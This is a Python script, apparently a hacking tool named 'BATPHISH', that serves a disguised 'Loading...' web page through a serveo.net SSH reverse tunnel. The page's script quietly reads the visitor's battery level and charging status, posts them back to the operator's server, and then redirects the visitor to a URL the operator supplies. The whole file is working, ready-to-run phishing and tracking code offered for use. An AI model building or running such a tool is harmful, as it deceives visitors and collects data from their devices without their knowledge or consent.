import http.server
import socketserver
import subprocess
import threading
import time
import json
import sys
import os

os.system("clear")
print("""\033[1;91m
             ⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠙⢷⣤⣤⣴⣶⣶⣦⣤⣤⡾⠋⠀⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
             ⠀⠀⠀⠀⣼⣿⣿⣉⣹⣿⣿⣿⣿⣏⣉⣿⣿⣧⠀⠀⠀⠀
             ⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
             ⣠⣄⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡄⠀⣠⣄
             ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
             ⣿⣿⡇⢸⣿⣿ BATPHISH ⣿⣿⡇⢸⣿⣿
             ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
             ⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
             ⠻⠟⠁⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⠻⠟
             ⠀⠀⠀⠀⠉⠉⣿⣿⣿⡏⠉⠉⢹⣿⣿⣿⠉⠉⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀
             ⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀
\033[32;40m
             Coded by Anonycodexia
\033[32;40m""")

# Ask the user for the URL to redirect to
redirect_url = input("Enter the URL to which the user should be redirected: ")

# HTML content to serve
HTML_PAGE = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        navigator.getBattery().then(function(battery) {{
            const batteryInfo = {{
                level: battery.level,
                charging: battery.charging
            }};
            // Send battery info to the server
            fetch('/battery-info', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify(batteryInfo),
            }});
            
            // Redirect after 2 seconds
            setTimeout(function() {{
                window.location.href = "{redirect_url}";
            }}, 2000);
        }});
    </script>
</body>
</html>
"""

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default HTTP server logs
        return

    def do_GET(self):
        # Serve the HTML page when the root path is accessed
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            # Handle 404 for any other path
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        # Handle the battery information POST request
        if self.path == '/battery-info':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            battery_info = json.loads(post_data)

            # Extract and print battery info
            battery_level = battery_info.get('level', 0) * 100  # Convert to percentage
            charging_status = "Charging" if battery_info.get('charging') else "Not Charging"
            print(f"Battery Level: {battery_level:.1f}%")
            print(f"Charging: {charging_status}")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Battery Info Received")

def start_server():
    # Start a simple HTTP server on port 5000
    with socketserver.TCPServer(("0.0.0.0", 5000), CustomHandler) as httpd:
        print("Serving on port 5000...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")
            httpd.shutdown()

def run_serveo():
    # Open a subprocess to run the Serveo command
    process = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)

    # Continuously read from stdout to find the URL
    while True:
        output = process.stdout.readline()
        if output == b'' and process.poll() is not None:
            break
        if output:
            output_str = output.decode().strip()
            # Check if output contains the actual URL
            if "Forwarding HTTP traffic" in output_str:
                # Extract and print the URL from the output
                url = output_str.split(' ')[-1]
                print(f"Access your app at: {url}")

if __name__ == "__main__":
    try:
        # Start the HTTP server in a daemon thread
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()

        # Allow the server to start
        time.sleep(2)

        # Run Serveo in the main thread
        run_serveo()
    except KeyboardInterrupt:
        print("\nInterrupted! Exiting...")
        sys.exit(0)
